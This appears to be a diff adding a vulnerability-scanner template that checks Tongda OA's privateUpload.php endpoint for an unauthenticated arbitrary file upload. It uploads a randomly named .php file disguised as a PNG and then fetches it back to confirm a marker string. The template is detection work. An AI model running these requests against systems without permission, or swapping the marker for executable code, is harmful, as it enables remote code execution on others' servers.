@@ -1,0 +1,36 @@
+id: tongda-oa-privateupload-upload
+
+info:
+  name: 通达OA privateUpload.php 接口存在前台任意文件上传漏洞
+  author: tongda
+  severity: high
+  tags: tongda
+
+variables:
+  filename: "{{rand_base(6)}}.php"
+
+http:
+  - raw:
+      - |
+        POST /general/vmeet/privateUpload.php?fileName={{filename}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHRhkXyQjTSAk8j8c
+
+        ------WebKitFormBoundaryHRhkXyQjTSAk8j8c
+        Content-Disposition: form-data; name="Filedata"; filename="png.png"
+        Content-Type: image/png
+
+        2d5s35dkogksuiikdusd
+        ------WebKitFormBoundaryHRhkXyQjTSAk8j8c--
+      
+      - |+
+        GET /general/vmeet/upload/temp/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - status_code_2 == 200
+          - contains(body_2, '2d5s35dkogksuiikdusd')
+        condition: and
